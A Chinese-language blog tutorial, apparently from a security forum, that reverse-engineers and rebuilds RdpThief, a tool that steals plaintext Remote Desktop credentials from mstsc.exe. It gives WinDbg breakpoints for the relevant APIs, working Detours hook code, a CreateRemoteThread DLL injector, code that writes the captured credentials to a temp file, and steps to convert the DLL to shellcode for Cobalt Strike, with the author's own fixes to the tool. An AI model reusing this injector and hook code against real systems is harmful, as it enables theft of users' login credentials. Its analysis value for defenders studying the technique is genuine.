0x01 前言
-------

RdpThief 其实一个老工具了（19年的），奈何我太菜了，最近才发现，所以今天还是老样子，咱们继续分析一下工具原理。**大佬请绕路！！**

> 本人知识有限，如果有错误的地方，请各位大佬指出！

0x02 复现
-------

首先，肯定是先复现一波。去 <https://github.com/0x09AL/RdpThief> 把仓库下载下来

然后把`RdpThief_x64.tmp`和`RdpThief.cna`放到 cs 服务端的`scripts`目录下，然后用 cs 的`脚本管理器`加载`RdpThief.cna`插件就行，这个我就不截图了。。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-45015e8b9503d58ebaef84739a5305e4c0dc0526.png)

然后就是根据 README 所说的，`rdpthief_enable`启动，等待受害机器打开`mstsc`远程连接别的机器。当看到`Tasked beacon to inject...`，接着输`rdpthief_dump`就可以看到主机+账号+密码了

> 下图虽然有很多方框，但是勉强还是能看到内容的。此外，我们仔细观察会发现，第二段的 server 是乱码。。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eda45559bdd0063e48c8fec788f66a3162b6f725.png)

0x03 分析准备
---------

测试环境：两台 win10

用到的工具：

- [API Monitor](http://www.rohitab.com/apimonitor#Download)
- [WinDbg](https://down.52pojie.cn/Tools/Debuggers/)

首先打开 API Monitor，在`API Filter`-&gt;`Capture`，把所有项都勾上

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25dd14d17b8c7c26f5d7ddcc5fc95bac834f985e.png)

同时，在`API Filter`-&gt;`Display`增加一项，把 `DLLMAIN`动态链接库入口函数隐藏掉，如下：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5a7f7429ff744da087ea33968593fba40541ab35.png)

接着我们`Win+R`打开运行窗口，输入`mstsc`打开远程桌面连接

然后回到 API Monitor，在`Running Processes`窗口找到刚刚打开的`mstsc.exe`进程，右键-&gt;`Start Monitoring`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c9b65cc4b98f5cac83aa8cc220ed4eacacc33e76.png)

接着展开`Monitored Processes`窗口下的`mstsc.exe`进程-&gt;`Modules`-&gt;`mstsc.exe`，如下图：

> 其实这里直接双击`Monitored Processes`窗口下的`mstsc.exe`进程，在这里直接搜索就行。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3266bbbbe26ab4f1302b456f77b88143e6ff0974.png)

然后回到远程桌面连接，输入要远程的机器ip+用户名+密码

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fd546f8448645f298cc33226812cd07bb0b0e37a.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6108a055fca2d4d41c5dde047dd9d2f087e8abe8.png)

成功连接之后，API Monitor 要抓的数据已经齐全，因此准备工作到此结束。接下来是开始分析了。

0x04 分析
-------

### 1. 拦截用户名

在`mstsc.exe`下搜索刚刚登录的用户名`root`，如下图：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a4ff8320eaa57fcbc22bb71e87e3213756575755.png)

可以看到，我们的用户名出现在`Advapi32.dll`下的`CredIsMarshaledCredentialW`函数的第一个参数`LPTSTR`里面。

接下来用 WinDBG 调试一下，直接附加（Attach）`mstsc.exe`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bb271d1f5c0c0f05b0fdd54e1967c98ec54b47fd.png)

在`ADVAPI32.dll`下的`CredIsMarshaledCredentialW`函数上打断点，并且输出 rcx 寄存器的内容

```WinDBG
bp ADVAPI32!CredIsMarshaledCredentialW "du @rcx"
```

> 为啥要查看rcx寄存器的内容呢？这里涉及一个函数调用规定-- `fast call`：一个函数在调用时，前四个参数是从左至右依次存放于`RCX`、`RDX`、`R8`、`R9`寄存器里面  
> 而，通过API Monitor 我们已经得知，`CredIsMarshaledCredentialW`函数只有一个参数，因此其值会放在`rcx`寄存器中

如果我们现在直接打断点，会出现错误如下：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0d810da9a38dad6e267ab630c025fa0e30d6f5da.png)

这是为啥呢？为啥找不到这个函数呢？我首先怀疑的是符号表没有加载好。

```WinDBG
lm m ADVAPI32
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee778f053b2e63827cfb826507f0a884f1313685.png)

发现已经加载了，那就是函数名字变了，于是我用`*`模糊搜一下

```WinDBG
x ADVAPI32!CredIsMarshaled*
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e34d04651e7a53fffc62b4ef01f5c3665f04973b.png)

发现函数名字改了。。。根本不是`CredIsMarshaledCredentialW`，看来`API Monitor`还是有点问题的。现在不太确定是哪个函数，没关系，两个都打上断点试试

```WinDBG
bp ADVAPI32!CredIsMarshaledCredentialA "du @rcx"
bp ADVAPI32!CredIsMarshaledCredentialWStub "du @rcx"
```

然后按`F5`或者点击如图的图标或者在命令窗口输入`g`运行

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8afe93aa227058f834d1434ba1c661e0c7f412a.png)

点击`连接`，输入密码，触发断点。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f94927bae6d3ae8eca1242260d2fe605142cd677.png)

发现断点断在了`ADVAPI32!CredIsMarshaledCredentialWStub`，且用户名打印了出来

至于为啥要看 rcx，上面已经解释了，`fast call`的原因，第一个参数放在`rcx`上。当然，我们也可以很暴力的，直接把 rcx 寄存器所在的内存打印出来看看就知道了

```WinDBG
db rcx
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-75f07d41b7a5888f22c4addb102e32c2589f292d.png)

ok，用户名到手！

### 2. 拦截主机名

接下来是主机名，回到`API Monitor`，同样还是`module`下的`mstsc.exe`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b933b684373df0b65a74c11fba219fe5308ccd2b.png)

从上图可知，主机名出现在了`Advapi32.dll`下的`CredReadW`函数的第一个参数上。继续搜搜

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a55ee1870cd4c09f04ddc81dea517b4b31b9e538.png)

发现主机名也出现在了`SspiCli.dll`下的`SspiPrepareForCredRead`函数的第二个参数上。

WinDBG走起，为了下面方便，把刚刚设置的断点给关掉先，也可以直接`Debug`-&gt;`Restart`，简单粗暴

```WinDBG
bl  # 列出断点
bd 0 # 禁用0号断点
bd 1 # 禁用1号断点
```

> 直接点图中的`Disable`或者`Clear`也行

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0e35080069ab74ebd0adb6c59aef10eeca6fe162.png)

有了刚刚的错误经验，我们可以先看看

```WinDBG
x ADVAPI32!CredRead*
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2c910687a875414dc83b1e2f052c38078312a3b5.png)

果然变了，打上断点，`g`运行，然后点击`连接`，触发断点

```WinDBG
bp ADVAPI32!CredReadWStub "du @rcx"
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ac4fdee3d33da3e2d770ce4c278fc721b94c161.png)

发现啥也没有，输入`g`，再次运行，又触发了断点，这次有内容了。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-554f71658e315d6fdf09cebc1a735fedb52f9d58.png)

同样地，为啥看 rcx，因为是第一个参数，打印一下即可，这里发现，rcx 和 rbx 都有

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a2f8121a74721a6c4077c7d4ebaadf5d7ba71118.png)

再看看第二个函数`SspiPrepareForCredRead`，因为是第二个参数，所以这里打印`rbx`，同时记得把刚刚的断点禁用掉。

```WinDBG
bp SSPICLI!SspiPrepareForCredRead "du @rdx"
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9a00e1e86e0ba2239af9d136bc214d9105d0c24.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d5480daea292ff9b3b31cb32d2bd160edc31aa2e.png)

ok，主机名到此为止。

### 3. 密码

接下来就是密码了。对于 Windows 的应用程序来说，如果内存中有一些敏感数据需要加解密，可以使用 DPAPI（数据加密保护接口）。DPAPI 是Windows**系统级**对数据进行加解密的一种接口。具体可以参考：[https://blog.csdn.net/xiaoqing\_2014/article/details/79546957](https://blog.csdn.net/xiaoqing_2014/article/details/79546957) 。基于这个前提，我们可以简单的认为（我猜[Rio](https://twitter.com/0x09al)也是这样想的），rdp登录的密码，也会用到它，即加解密内存的接口`CryptProtectMemory`和`CryptUnprotectMemory`。

直接双击`Monitored Processes`窗口下的`mstsc.exe`进程，直接搜`CryptProtectMemory`，找到调用。

首先是把用户名丢过去加密了。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ccf9aea4bf9fe915e7aec039ddc521743cb8bd11.png)

然后才是我们需要的密码。

> 这个密码直接搜是搜不到的。。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6254d55879690df830ff7253ad11ea8ef7644f84.png)

由上图得知，我们的密码确实出现在`Crypt32.dll`下的`CryptProtectMemory`的第一个参数`pData`里面，直接上 WinDbg 打断点。

```WinDBG
bp crypt32!cryptprotectmemory
```

无法识别，如下图

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6fdd8be776e50f4f322d87b346a8d5537863d9b3.png)

老规矩，模糊搜一下，发现只有一个`CryptProtectData`，那还等啥，直接打断点

```WinDBG
x crypt32!CryptProtect*
bp CRYPT32!CryptProtectData
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0c829176a71f483f1a007a5956b91b7695d9ef89.png)

输入`g`，连接，输密码，直接连上了。。。。

为啥没有停在断点上？？？？是不是我操作出错了？？？然后我重新试了一下，发现还是没有停下来。

先思考一下没有停下来的原因。回忆一下刚刚的流程：本来我们应该要给`crypt32!cryptprotectmemory`打断点，但是找不到，所以我们模糊搜了下，发现只有`crypt32!CryptProtectData`有点类似，所以给它打断点了，最后运行的时候没有停下来。说明这个有点类似的函数`crypt32!CryptProtectData`根本不是 API Monitor 中提到的函数，所以现在的解决思路就是，找一下`crypt32!cryptprotectmemory`函数，到底是不是在`crypt32`模块中。

于是我决定，找官方文档：<https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory>

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e5c3ae3a37fb432c7ce84bc4e1d1d0ffd1f91c63.png)

官方文档也是说这个函数在`Crypt32.dll`里面。

因此，我不得不搬出神器：<https://github.com/strontic/xcyclopedia> ， 它的网页版在 <https://strontic.github.io/> ，在上面搜 `CryptProtectMemory`，发现，该函数除了在`crypt32.dll`有，在`dpapi.dll`里面也有。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-12fb94965df1ce80c5221bbe2ab3ce7f2ffd2a0e.png)

点开 <https://strontic.github.io/xcyclopedia/library/dpapi.dll-BC3EF1D4F109A82BDFE085604B822517.html> 看一下，它已经作为`dpapi.dll`的导出函数了。。。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dbf17c9c17a4fd4e65d683378705cb5011abb17a.png)

不多bb，WinDbg 直接`Ctrl+Shift+F5`重启，打断点

```WinDBG
bp dpapi!cryptprotectmemory
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-814f97617a8ebe8202c3cb6a66841e63724de1ec.png)

发现还是报错。模糊搜一下 ：

```WinDBG
x DPAPI!crypt*
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f9600b10acc2558c50850b9915421e201f79d5f.png)

发现连`DPAPI` 模块都没有识别出来，查一下模块加载

```WinDBG
lm m DPAPI
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80e2ef9556b0a2a2d2fa7ba69dbdcaf11e8109b1.png)

果然这个`DPAPI.dll`还没加载，对于没有加载的模块，打断点，我们都是用`bu`预加载代替`bp`的

> 实际上，`bp`打断点没有找到的话，会自动转换成`bu`，这里之前已经用`bp`打过断点了，所以这里就不再用`bu`打了

```WinDBG
bu dpapi!cryptprotectmemory
```

打完断点后，`g`运行，连接，输密码，停在了`dpapi!CryptProtectMemory`处

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61b097366c90e96a85cfa29a64684bce8b388b19.png)

此时我们查看一下`rcx`（第一个参数）的内容，发现里面出现了用户名，对应上了刚刚 API Monitor 中看到的，第一次是加密用户名。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d2b2eb46500803222fc5d04739e0330044ed8ce.png)

接下来输入`g`继续运行，再查看一下`rcx`的内容，终于看到了我们梦寐以求的密码了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8923f5ceb432b2e7845d10dc854df15a1fff3c10.png)

可以看到前面有4个字节的内容我们是用不到的，所以可以跳过这四个字节，直接显示密码

```WinDBG
du @rcx+4
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-45ff79d85e4407381d5fbd19f297893a145be508.png)

当然，我们也得搞懂，这4个字节代表啥，直接访问官方文档 <https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory> ，查看第一个参数的含义。里面该参数里面还有个`cbData`，用于**指定将被加密的字节数**，所以这四个字节，就是存要加密的密码的字节数的。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-048958bd12a5322530b9eef29c800a57531ed486.png)

至此，密码到手。

### 4. 小结

综上，我们会用到以下的 API：

- `CredIsMarshaledCredentialWStub` --&gt; 用户名
- `CredReadWStub`/`SspiPrepareForCredRead` --&gt; 主机名
- `CryptProtectMemory` --&gt; 密码

0x05 RdpThief
-------------

### detours 的简单使用

分析了这么久，终于要开始研究大佬写的 RdpThief 了，因为 RdpThief 使用 detours 库开发的，所以这里简单提一下该库的使用。具体可以看链接： <https://blog.csdn.net/z971130192/article/details/100565398> 。

直接上Github下载：<https://github.com/microsoft/detours>。

下面就可以开始编译工作了。

解压后的文件夹应该如下图所示：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-be8497de0c227d7092adc3c6109fd691a64c9ce2.png)

然后，在开始菜单中找到`x64 Native Tools Command Prompt for VS 2019` 和 `x86 Native Tools Command Prompt for VS 2019`，这两个可以分别用来编译64位和32位的Detours，如下图所示。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1435302f214c8fb96d3be280e136fcb63ffd09dd.png)

下面就简单了，以`x64 Native Tools Command Prompt for VS 2019`为例，定位路径到解压的 Detours 文件夹的 `src` 目录下，然后使用 `nmake` 编译，编译完成后，会在根目录生成`bin.X64`、`lib.X64`、`include`这三个文件夹，如图所示：

```bash
cd src
nmake /f Makefile
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb57e6c6942b9498f1dbe81d092a77ed4cd44957.png)

接着我们新建一个vs项目，右键项目-&gt;属性

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f0439518e55b143d7a5f906c034e421beb3ad74b.png)

配置属性-&gt;VC++目录，把刚刚生成的`include`目录加到`包含目录`里面，`lib.X64`目录加到`库目录`里面

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d2af42b50dd7dd766b1c88f8ab9d0625f039b34f.png)

然后我们写一个测试代码了，如下：

```cpp
#define _CRT_SECURE_NO_DEPRECATE

#include <iostream>
#include <windows.h>

// 关键是这两行，导入 detours
#include "detours.h"
#pragma comment(lib, "detours.lib")

using namespace std;

int (WINAPI* Old_MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) = MessageBoxW;

int WINAPI New_MessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
{
    // 这里可以做任意的操作
    return Old_MessageBoxW(NULL, L"Hooked MessageBoxW content", L"Hooked MessageBoxW title", NULL);
}

void Hook()
{
    DetourTransactionBegin();                                   // 开始一个事务，拦截开始
    DetourUpdateThread(GetCurrentThread());                     // 更新当前线程
    DetourAttach(&(PVOID&)Old_MessageBoxW, New_MessageBoxW);    // 将拦截的函数 New_MessageBoxW 附加到原函数 Old_MessageBoxW 的地址上
    DetourTransactionCommit();                                  // 提交事务，拦截生效
}

void DeHook()
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)Old_MessageBoxW, New_MessageBoxW);    // 解除 Hook ，将拦截的函数从原函数的地址解除
    DetourTransactionCommit();
}

int main()
{
    // 先调用一下原来的函数
    MessageBoxW(NULL, L"原来的MessageBoxW content", L"原来的MessageBoxW title", NULL);
    // hook之后再调用
    Hook();
    MessageBoxW(NULL, L"原来的MessageBoxW content", L"原来的MessageBoxW title", NULL);
    // unhook 之后再调用
    DeHook();
    MessageBoxW(NULL, L"原来的MessageBoxW content", L"原来的MessageBoxW title", NULL);
    return 0;
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-782096797547c93ded6333eaf6e947dbebb8171d.png)

效果如下：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6cc9169f72597bf3ce4f821eab7b6a65c1bda7d7.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-30784f92a6038a3057dae0df9df0341097305639.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9880b4038f45a3fc23531ed2f7d9b17075e41f32.png)

可能有些同学会好奇，代码中定义的这个`MessageBoxW`函数的函数指针是怎么拿到的，很简单，代码中调用一下`MessageBoxW`，然后右键 -&gt; 转到定义

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7559921140a84ac86cfd661bab54f0ea7f9e95d.png)

就可以看到定义了。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3fb6e9a5da38f723b2b8ffbc55ddc498a88a9465.png)

### 重新编译 RdpThief

在了解完 detours 库的简单使用之后，我们开始研究 [RdpThief](https://github.com/0x09AL/RdpThief) 的代码。

先把代码下载下来，然后用 vs 新建一个`动态链接库(DLL)`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-41f41da99c73b3389021ee52f3c4867f2d5608e7.png)

把`RdpThief.cpp`直接拖进 vs 的项目中，并且把原来vs的项目中的`dllmain.cpp`文件删掉，同时把`RdpThief.cpp`代码中的`#include "stdafx.h"`改成`#include "pch.h"`，并加一行`#pragma comment(lib, "detours.lib")`如下：

> `stdafx.h`包含了`targetver.h`，`targetver.h`里面又包含了`SDKDDKVer.h`，这玩意给老版本的 windows 用的，包不包含其实问题不大，这里我就不管了。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7f5c189ab831aefbd87f9ab7debc6c30647ff89c.png)

因为还没配置 detours，所以会报错。首先选择一下版本和平台。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-833db7ef73c01e3b3f4cfb27fce916cc1e68bc10.png)

然后按照上面小节中的，配置 detours 的过程配置一下就行，如下：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-74c3461aa52dabee4ece5f9f650d01ea3951c1fd.png)

配置完后，就不会报错了。现在就可以选择`生成`-&gt;`重新生成解决方案`来生成dll了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8e3e8c446811e1a4668d711da047ccb42b698c6a.png)

因为我选择了`Release`和`X64`，所以生成的 dll 在代码文件夹下的 x64 -&gt; Release

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ada06fb84d53a262335c860066a1d0a9549d4b82.png)

### 测试 RdpThief.dll 是否可用

生成了 dll 之后，我们得测试一下，这玩意能不能用。怎么测试呢？把 dll 注入到`mstsc.exe`进程中就行。好啦，接下来这部分的内容就是**dll注入**的内容了。

因为dll注入不是本文的重点，所以这里不会详细讲解，只列出大概的注入过程，有机会的话，后面我们可以仔细探讨一下。

1. 打开进程句柄
2. 分配一块可读写的内存空间
3. 将所需DLL的路径写入内存
4. 获得LoadLibraryA函数地址
5. 通过远程线程执行LoadLibraryA函数，并且指定参数为DLL路径的内存地址

这里多了一个`getPPID`函数，主要用于根据进程名，自动获取进程id，懒得每次手动输入 mstsc.exe 的 pid 了。

```cpp
#define _CRT_SECURE_NO_DEPRECATE

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

// 根据进程名，获取进程id
DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    HANDLE processHandle;
    PVOID remoteBuffer;
    // 修改这里的dll路径
    wchar_t dllPath[] = TEXT("E:\\code\\RdpThief\\x64\\Release\\RdpThief.dll");

    LPCWSTR parentProcess = L"mstsc.exe";
    DWORD parentPID = getPPID(parentProcess);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
```

先打开`win+r`-&gt;`mstsc`打开远程桌面，然后运行上面代码，运行结束后，再点连接输入密码。连接成功后，在`temp`目录下就可以看到生成的`data.bin`了

> `win+r`，输入`%temp%`可以打开临时目录。因为`RdpThief.dll`把抓到的账号密码放到了临时目录下的`data.bin`，所以我们要看这里。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eb947dfe260f5012134ecd9748b1e86b2490c093.png)

ok，至此，我们已经知道怎么测试 RdpThief.dll 了。

### 修改 RdpThief

所以，接下来就是修改 RdpThief 了。RdpThief 使用把`SspiPrepareForCredRead`拦截主机名，这里把 `SspiPrepareForCredRead` 修改成 `CredReadWStub` 拦截主机名。

还记得之前我们咋找到 MessageBoxW 的定义吗？这里也一样，随便找个地方，直接输入`CredReadWStub`，尴尬的是，只有`CredReadW`没有`CredReadWStub`，这点倒是和WinDbg中的不一样，和 API Monitor中的一样。确实把我搞蒙了，如果有大佬知道，麻烦告知一下。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e84a05abbf2caf578fb1bdac87e46d376e037217.png)

那既然没有`CredReadWStub`，那就用`CredReadW`呗，右键-&gt;转到定义，拿到了如下的定义。

```cpp
WINADVAPI
BOOL
WINAPI
CredReadW (
    _In_ LPCWSTR TargetName,
    _In_ DWORD Type,
    _Reserved_ DWORD Flags,
    _Out_ PCREDENTIALW *Credential
    );
```

所以简单改改，函数指针就有了。

```cpp
static BOOL (WINAPI * OriginalCredReadW)(_In_ LPCWSTR TargetName, _In_ DWORD Type, _Reserved_ DWORD Flags, _Out_ PCREDENTIALW* Credential) = CredReadW;
```

然后仿造这个函数声明，定义一个`HookedCredReadW`函数，函数里面只把参数`TargetName`赋值给全局变量`lpServer`就行。整体如下：

> 这个全局变量就是之后写入文件中的主机名了

```cpp
static BOOL (WINAPI * OriginalCredReadW)(_In_ LPCWSTR TargetName, _In_ DWORD Type, _Reserved_ DWORD Flags, _Out_ PCREDENTIALW* Credential) = CredReadW;

BOOL HookedCredReadW(_In_ LPCWSTR TargetName, _In_ DWORD Type, _Reserved_ DWORD Flags, _Out_ PCREDENTIALW* Credential)
{
    // 拿到主机名
    lpServer = TargetName;
    // 其他不变，调用原来的函数
    return OriginalCredReadW(TargetName, Type, Flags, Credential);
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d1ca489cab7c16ef8f96d93ae9d10ae2a1666362.png)

当然，我们需要注册新的 hook `HookedCredReadW` 并取消注册旧的 hook `_SspiPrepareForCredRead`。

```cpp
DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);

DetourDetach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1d1075323d8a8163862b0198b8d5d559793642b2.png)

重新生成dll，并按照上一小节的测试过程，重新测试一遍，可以看到效果一致

> 记得把原来的 data.bin 删了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e352eaf8fa973c9b53825fb9475e7dfb0950cba1.png)

### 看一下代码

其实整体代码，唯一有点小疑问的，就是`CryptProtectMemory`的 hook 函数那里，第一个参数`pDataIn`的地址，为啥要`+0x1`

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5fbec9607de0e60fd7471b1166d525b2b64a8297.png)

其实仔细想想，我们之前分析的时候，第一个参数 `pDataIn`里面，前四个字节是`cbData`，4个字节，不正正好是偏移一个地址吗？所以这个`+0x1`刚刚好。

0x06 cna插件
----------

根据作者在文章 <https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/> 中提到的，可以用 <https://github.com/monoxgas/sRDI> 把 dll 转换成 shellcode，让cs加载。

具体就是把sRDI 仓库下载下来后，进入其`python`文件夹，运行以下命令，然后把生成的`RdpThief.bin`改名成`RdpThief_x64.tmp`

```bash
python3 ConvertToShellcode.py RdpThief.dll
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8ffd2a0a93e6c221c8912fe30bd2cd31ba6ae7f7.png)

然后放在cs 服务端下，加载插件就行，具体可以参看《0x02 复现》那一小节。从下图可以看出来，我们自己编译的dll，转换成的shellcode，cs可以正常加载，并且能成功拿到密码。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bf8637b5d63a3c8fea4cf8e23ab7cca7f78ed43e.png)

0x07 解决方框问题
-----------

`rdpthief_dump`命令，实际上是用 type 命令读取`%temp%\data.bin`，会出现方框，肯定是编码的问题

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c6a2e46b3278f19f1fe5ebce055a8d27fa753e16.png)

原来的写文件代码如下：

```cpp
VOID WriteCredentials() {
    const DWORD cbBuffer = 1024;
    TCHAR TempFolder[MAX_PATH];
    GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
    TCHAR Path[MAX_PATH];
    StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
    HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WCHAR  DataBuffer[cbBuffer];
    memset(DataBuffer, 0x00, cbBuffer);
    DWORD dwBytesWritten = 0;
    StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n",lpServer, lpUsername, lpTempPassword);

    WriteFile(hFile, DataBuffer, wcslen(DataBuffer)*2, &dwBytesWritten, NULL);
    CloseHandle(hFile);
}
```

它使用 unicode（wchar）编码的，所以我们可以考虑，把 wchar 转成 char 试试。

直接修改`RdpThief.cpp`，首先增加三行代码，因为用到了`string`和`ofstream`

```cpp
#include <iostream>
#include <fstream>
using namespace std;
```

然后增加一个 wchar 转 char 的方法，这里用到了[WideCharToMultiByte](https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte) 函数

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-efbf557e253c7ba0e83ca95d7d0ab12182177567.png)

```cpp
char* UnicodeToChar(LPCWSTR unicode_str)
{
    int num = WideCharToMultiByte(CP_OEMCP, NULL, unicode_str, -1, NULL, 0, NULL, FALSE);
    char* pchar = (char*)malloc(num);
    WideCharToMultiByte(CP_OEMCP, NULL, unicode_str, -1, pchar, num, NULL, FALSE);
    return pchar;
}
```

剩下的就是写文件了，先把原来的`WriteCredentials`方法注释掉，然后加入以下的方法。

```cpp
VOID WriteCredentials() 
{
    // 获取临时目录，并转换成char*
    TCHAR wtempPath[MAX_PATH];
    DWORD dwSize = 50;
    GetTempPath(dwSize, wtempPath);
    char tempPath[MAX_PATH];
    wcstombs(tempPath, wtempPath, wcslen(wtempPath) + 1);

    string temp_path(&tempPath[0], &tempPath[strlen(tempPath)]);

    // 打开临时文件
    ofstream f_temp(temp_path + "data.bin");
    if (f_temp) {
        f_temp << "Server: " << UnicodeToChar(lpServer) << "\nUsername:" << UnicodeToChar(lpUsername) << "\nPassword: " << UnicodeToChar(lpTempPassword) << "\n\n";
    }
    f_temp.close();
}
```

因为这里用了`wcstombs`，vs 可能会报错如下：

```php
'wcstombs': This function or variable may be unsafe. Consider using wcstombs_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
```

找到`项目属性`-&gt; `配置属性`-&gt;`C++`里的`预处理器定义`，在里面加入一段代码：`_CRT_SECURE_NO_WARNINGS`即可。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-84a8bef2fe83388ac010a2efe11dae1cdf4661a1.png)

然后重新打包成dll，测试一波，没毛病

> 这里我测试的时候，生成的文件是 temp\_out.txt 而不是 data.bin

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e2280d09771b86413ee1543b96a5b3d90e8538ba.png)

然后就是老规矩，用 sRDI 把dll转成 shellcode，丢给cs试试，也没问题

![origin_img_v2_a63b5a1e-15a5-42ac-a900-79f6e7c3fcfg](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7be47ed64b547e4548359ac2b910f89710fdcf73.png)

后面测试发现，主机名+账号+密码，有时候能够完整的获取到，有时候又不行，直接是乱码，最后我是在没辙了，把原来的方法改成`WriteCredentials_bak`，放到我新的方法后面再调一遍，别问为什么，问就是两种编码结合，稳。

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1df87079977fba145c9d4264f3041c5988bc3edf.png)

0x08 解决 win7 无法使用问题
-------------------

win7 系统下，一注入dll，mstsc.exe 就会崩溃。。。解决方法如下：

项目-&gt;属性-&gt;配置属性-&gt;C/C++ -&gt; 代码生成，把运行库从`多线程DLL(/MD)`改成`多线程(/MT)`即可

